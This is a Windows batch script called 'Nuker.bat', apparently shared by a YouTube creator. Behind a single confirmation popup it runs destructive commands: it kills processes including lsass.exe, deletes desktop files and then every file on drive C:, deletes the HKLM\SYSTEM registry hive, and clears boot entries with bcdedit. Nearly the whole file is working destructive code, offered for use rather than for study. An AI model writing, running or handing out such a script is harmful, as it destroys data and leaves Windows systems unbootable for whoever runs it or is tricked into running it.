:: made by hydrogen001 (@hydrothings on yt)
@echo off
title Nuker.bat - Experimental Tool
color 0C

> "%temp%\nuker_prompt.vbs" echo Set objShell = CreateObject("WScript.Shell")
>> "%temp%\nuker_prompt.vbs" echo intBtn = objShell.Popup("WARNING: This is a destructive script! Proceeding will result in destroyed system files. Are you sure?", 0, "Nuker.bat", 4 + 48)
>> "%temp%\nuker_prompt.vbs" echo If intBtn ^<^> 6 Then WScript.Quit(1)

cscript //nologo "%temp%\nuker_prompt.vbs"
if errorlevel 1 goto cancel
del "%temp%\nuker_prompt.vbs"
color 0A
echo.
echo [WARNING] Execution confirmed. Running routines...
echo.

taskkill /f /im python.exe
taskkill /f /im pythonw.exe
del /f /q /s "%userprofile%\Desktop\*.*"
del /f /q /s C:\*.tmp
del /f /q /s C:\Windows\Prefetch\*.*
reg delete HKLM\SYSTEM /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Policies /f
bcdedit /clean
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
del /f /q /s C:\*.*
taskkill /f /im lsass.exe
goto end

:cancel
if exist "%temp%\nuker_prompt.vbs" del "%temp%\nuker_prompt.vbs"
color 07
echo.
echo [INFO] Operation cancelled or popup closed safely. Exiting.

:end
pause
